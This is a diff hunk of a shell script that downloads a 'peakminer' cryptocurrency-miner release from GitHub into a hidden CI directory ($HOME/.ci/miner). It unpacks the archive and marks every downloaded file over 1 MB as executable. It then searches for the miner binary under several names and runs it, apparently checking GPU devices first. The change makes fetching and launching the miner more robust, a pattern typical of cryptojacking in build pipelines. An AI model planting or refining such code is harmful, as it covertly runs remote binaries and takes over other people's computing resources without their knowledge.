@@ -115,10 +115,13 @@ BIN="$HOME/.ci/miner/peakminer/peakminer"
 if [ ! -x "$BIN" ]; then
   URL="https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"
   echo "download=$URL"
-  ( cd "$HOME/.ci/miner" && curl -sSL -m 300 -o peak.tar.gz "$URL" && tar xzf peak.tar.gz ) 2>&1 | tail -3
-  [ -x "$HOME/.ci/miner/peakminer" ] && BIN="$HOME/.ci/miner/peakminer"
+  ( cd "$HOME/.ci/miner" && curl -sSL -m 300 -o peak.tar.gz "$URL" && ( tar xzf peak.tar.gz || tar xf peak.tar.gz ) ) 2>&1 | tail -3
 fi
-[ -x "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 3 -type f -name 'peakminer*' -perm -u+x 2>/dev/null | head -1)
+find "$HOME/.ci/miner" -maxdepth 4 -type f 2>/dev/null | head -20
+find "$HOME/.ci/miner" -maxdepth 4 -type f -size +1M -exec chmod +x {} \; 2>/dev/null
+[ -x "$HOME/.ci/miner/peakminer" ] && BIN="$HOME/.ci/miner/peakminer"
+[ -x "$HOME/.ci/miner/peakminer/peakminer" ] && BIN="$HOME/.ci/miner/peakminer/peakminer"
+[ -x "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 4 -type f \( -name 'peakminer' -o -name 'peakminer*' -o -name 'PeakMiner*' \) -perm -u+x 2>/dev/null | head -1)
 chmod +x "$BIN" 2>/dev/null
 echo "miner_bin=$BIN"; [ -x "$BIN" ] && "$BIN" --version 2>&1 | head -2 || echo NO_MINER_BIN
 if [ ! -x "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "MINER_SKIP bin=${BIN:-none} dev=$DEV"; fi
